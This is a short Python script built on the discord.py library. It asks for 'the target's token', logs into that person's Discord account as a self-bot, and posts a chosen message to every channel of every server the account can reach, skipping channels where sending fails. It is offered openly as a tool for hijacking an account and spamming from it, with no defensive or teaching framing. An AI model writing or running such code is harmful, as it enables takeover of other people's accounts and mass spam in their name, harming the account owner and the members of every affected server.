import discord
from discord.ext import commands
from discord import Intents

bot = commands.Bot(command_prefix="-", self_bot=True, intents=Intents.all())
token = input("Enter the target's token ")

send_message = "Your message you want to be sent here"

@bot.event
async def on_ready():
    print("Active")
    for guild in bot.guilds:
        for channel in guild.channels:
            # Tries to send message, if it can't (ex: no permissions, etc) it will print out that it can't and go onto the next channel
            try:
                # If it can, it will do the following:
                await channel.send(send_message)
                print(f"Sent to {channel.name}")
            except:
                # If it can't, it will do the following:
                print(f"Couldn't send message to {channel}")


bot.run(token, bot=False)
